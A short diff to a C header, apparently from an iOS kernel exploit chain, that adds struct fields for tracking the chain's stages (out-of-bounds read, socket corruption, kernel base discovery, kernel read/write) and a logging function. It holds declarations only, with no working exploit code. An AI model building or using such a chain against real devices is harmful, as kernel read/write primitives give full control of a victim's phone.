@@ -148,6 +148,12 @@ typedef struct pe_context {
     bool is_a18_devices;
     uint64_t kernel_base;
     uint64_t kernel_slide;
+    /* LSWCHAIN wiring 2026-11-16 (USB receipts on the 12: 210 oob-read
+       successes, ZERO hunt attempts — rung 2 never fired). rw_verified = 1
+       ONLY after the kbase walk proved magic+typeinfo through the corrupted
+       socket; cs2_kreadbuf/kwritebuf refuse to run otherwise. */
+    int rw_verified;
+    int chain_rung;   /* highest rung reached: 1 window, 2 pair, 3 corrupt, 4 kbase, 5 rw */
 
     mach_port_t socket_ports[CS2_MAX_SOCKETS_COUNT];    // save output mach port from fileport_makeport
     uint64_t socket_pcb_ids[CS2_MAX_SOCKETS_COUNT];  // save pcb gencnt on this array
@@ -165,5 +171,9 @@ extern cs2_context_t cs2_ctx;
    boot the calib produced 6 WRONG crossings. */
 extern uint64_t g_lsw_wrong_offs[16];
 extern int g_lsw_wrong_n;
+
+/* One receipt line per chain rung — the trace that makes the primitives
+   mean something (see rw_verified above). */
+void cs2_chain_rung_log(int rung, const char *what, uint64_t a, uint64_t b);
 
 #endif /* cs2_common_h */
